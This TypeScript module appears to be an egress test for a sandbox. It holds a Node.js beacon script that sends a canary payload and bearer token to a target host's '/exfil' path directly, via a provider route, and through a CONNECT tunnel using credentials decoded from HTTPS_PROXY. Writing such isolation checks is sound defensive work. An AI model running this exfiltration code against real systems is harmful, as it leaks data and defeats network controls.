import { PROVIDER_PREFIX } from './canary.ts';

export interface BeaconResult {
  readonly direct?: { readonly status?: number; readonly error?: string };
  readonly provider?: { readonly status?: number; readonly error?: string };
  readonly proxied?: { readonly status?: number; readonly error?: string };
}

export const BEACON_SCRIPT = `
const http = require('node:http');
const host = process.env.TARGET_HOST;
const port = Number(process.env.TARGET_PORT);
const body = process.env.CANARY_PAYLOAD || '';
const out = {};
const send = (key, path) => new Promise((resolve) => {
  const req = http.request({ host, port, method: 'POST', path, timeout: 2500, headers: { 'content-length': Buffer.byteLength(body), authorization: 'Bearer ' + (process.env.CANARY_TOKEN || '') } }, (res) => {
    out[key] = { status: res.statusCode }; res.resume(); res.on('end', resolve);
  });
  req.on('error', (e) => { out[key] = { error: e.code || e.message }; resolve(); });
  req.on('timeout', () => { out[key] = { error: 'timeout' }; req.destroy(); resolve(); });
  req.end(body);
});
const proxied = () => new Promise((resolve) => {
  if (!process.env.HTTPS_PROXY) return resolve();
  const p = new URL(process.env.HTTPS_PROXY);
  const auth = Buffer.from(decodeURIComponent(p.username) + ':' + decodeURIComponent(p.password)).toString('base64');
  const req = http.request({ host: p.hostname, port: Number(p.port), method: 'CONNECT', path: host + ':' + port, timeout: 2500, headers: { 'proxy-authorization': 'Basic ' + auth } });
  req.on('connect', (res, sock) => {
    out.proxied = { status: res.statusCode };
    if (res.statusCode === 200) {
      sock.write('POST /exfil HTTP/1.1\\r\\nhost: x\\r\\ncontent-length: ' + Buffer.byteLength(body) + '\\r\\n\\r\\n' + body);
      setTimeout(() => { sock.destroy(); resolve(); }, 500);
    } else { sock.destroy(); resolve(); }
  });
  req.on('error', (e) => { out.proxied = { error: e.code || e.message }; resolve(); });
  req.on('timeout', () => { out.proxied = { error: 'timeout' }; req.destroy(); resolve(); });
  req.end();
});
send('direct', '/exfil').then(() => send('provider', '${PROVIDER_PREFIX}use')).then(proxied).then(() => console.log(JSON.stringify(out)));
`;

export const parseBeacon = (stdout: string): BeaconResult => {
  try {
    return JSON.parse(stdout.trim().split('\n').at(-1) ?? '{}') as BeaconResult;
  } catch {
    return {};
  }
};

export const reached = (result: BeaconResult): boolean =>
  [result.direct, result.provider, result.proxied].some((leg) => leg?.status === 200);
